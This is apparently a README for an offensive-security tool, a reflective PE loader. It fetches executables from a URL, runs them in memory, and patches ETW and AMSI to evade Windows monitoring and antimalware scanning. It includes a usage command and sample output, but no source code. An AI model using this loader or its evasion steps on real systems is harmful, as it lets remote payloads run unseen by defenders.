# ReflectThis
A Reflective PE loader supporting Native executables, .NET executables, argument spoofing, and more

## Details
- Supports Native and .NET PE files
- Load Native or .NET PE file hosted on web server
- IAT Hook to common commandline functions to fix arguments
- Set proper permissions on loaded sections
- ETW and AMSI patching
- TLS Callback support

## Usage
```ps
> .\ReflectThis.exe [url] [args...]
[-] Patched EWT in host at 77b713c0
[-] Patched AMSI in host at 65935960
[-] copying PE section NT Header (01268CE8) -> 00400000
[-] copying PE section .text (012690E8) -> 00401000
[-] copying PE section .rdata (0126C2E8) -> 00405000
[-] copying PE section .data (0126DAE8) -> 00407000
[-] copying PE section .msvcjmc↨ (0126DCE8) -> 00408000
[-] copying PE section .rsrc (0126DEE8) -> 00409000
[-] copying PE section .reloc (0126E0E8) -> 0040A000
[-] resolving function GetCommandLineA -> 213f2
[-] resolving function GetModuleHandleA -> 77a31130
[-] resolving function GetProcAddress -> 77a2fb80
[-] resolving function LoadLibraryA -> 77a312a0
[-] resolving function GetCurrentProcess -> 77a33550
[-] resolving function FreeLibrary -> 77a311b0
[-] resolving function VirtualQuery -> 77a2fba0
[-] resolving function GetProcessHeap -> 77a2f9b0
[-] resolving function HeapFree -> 77a2e590
[-] resolving function HeapAlloc -> 77b55e70
[-] resolving function GetLastError -> 77a2e640
...SNIP...
```
